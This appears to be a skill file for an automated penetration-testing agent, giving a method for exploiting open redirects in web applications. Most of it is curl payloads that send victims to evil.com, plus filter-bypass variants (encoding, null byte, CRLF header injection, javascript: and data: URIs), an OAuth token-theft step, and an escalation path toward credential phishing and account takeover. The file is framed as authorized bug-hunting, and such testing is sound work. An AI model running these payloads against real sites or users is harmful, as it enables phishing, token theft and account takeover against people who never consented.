---
name: attack-open-redirect
description: "Open redirect exploitation — URL parameter manipulation, OAuth token theft, phishing chains"
category: "web-application"
version: "1.0"
author: "cyberstrike-official"
tags:
  - open-redirect
  - web
  - phishing
  - oauth
  - attack
tech_stack:
  - web
cwe_ids:
  - CWE-601
chains_with:
  - attack-cors
  - attack-jwt
prerequisites: []
severity_boost:
  attack-jwt: "Open redirect + OAuth = JWT/token theft"
---

# Open Redirect

## Objective

Exploit URL redirect parameters to redirect users to attacker-controlled domains, steal OAuth tokens, or bypass security controls.

## Testing Methodology

### Phase 1: Identify Redirect Parameters

Common parameter names:
```
url, redirect, redirect_url, redirect_uri, return, return_url, returnTo,
next, goto, target, dest, destination, rurl, redir, forward, continue,
callback, path, out, view, login_url, image_url, go, link, ref
```

### Phase 2: Basic Payloads

```bash
# Direct redirect
curl -s -D- "https://TARGET/redirect?url=https://evil.com"

# Protocol-relative
curl -s -D- "https://TARGET/redirect?url=//evil.com"

# Encoded
curl -s -D- "https://TARGET/redirect?url=https%3A%2F%2Fevil.com"

# Backslash bypass
curl -s -D- "https://TARGET/redirect?url=https://evil.com\@TARGET"

# At-sign bypass
curl -s -D- "https://TARGET/redirect?url=https://TARGET@evil.com"
```

### Phase 3: Filter Bypass

```bash
# Subdomain matching
curl -s -D- "https://TARGET/redirect?url=https://TARGET.evil.com"

# URL encoding tricks
curl -s -D- "https://TARGET/redirect?url=https://evil.com%23.TARGET"

# Double encoding
curl -s -D- "https://TARGET/redirect?url=https://%65%76%69%6c.com"

# Null byte
curl -s -D- "https://TARGET/redirect?url=https://evil.com%00.TARGET"

# CRLF + Location header
curl -s -D- "https://TARGET/redirect?url=%0d%0aLocation:%20https://evil.com"

# JavaScript scheme
curl -s -D- "https://TARGET/redirect?url=javascript:alert(document.domain)"

# Data URI
curl -s -D- "https://TARGET/redirect?url=data:text/html,<script>alert(1)</script>"
```

### Phase 4: OAuth Token Theft

```bash
# Test with OAuth tester
attack_script oauth_tester "https://TARGET/oauth/authorize" \
  --client-id CLIENT_ID \
  --redirect-uri "https://TARGET/callback" \
  --json-output
```

If redirect_uri accepts attacker domain, the OAuth code/token is sent to the attacker.

### Phase 5: Impact Escalation

- Redirect in login flow → credential phishing
- Redirect in OAuth flow → token theft (P1)
- Redirect in email verification → account takeover
- Redirect + SSRF → internal access

## What Constitutes a Finding

| Finding | Severity |
|---------|----------|
| Open redirect + OAuth token theft | Critical (P1) |
| Open redirect in login/auth flow | High (P2) |
| Generic open redirect | Medium (P3) |
| JavaScript scheme redirect (XSS) | High (P2) |

## Evidence Requirements

- URL with redirect parameter and payload
- Response showing 302/301 to attacker domain
- For OAuth: stolen authorization code/token
- Location header value in response

## Tools

- `attack_script oauth_tester` — OAuth redirect_uri bypass testing
- `curl` — manual redirect testing

## References

- [PortSwigger: Open Redirect](https://portswigger.net/kb/issues/00500100_open-redirection-reflected)
- [OWASP: Unvalidated Redirects](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html)
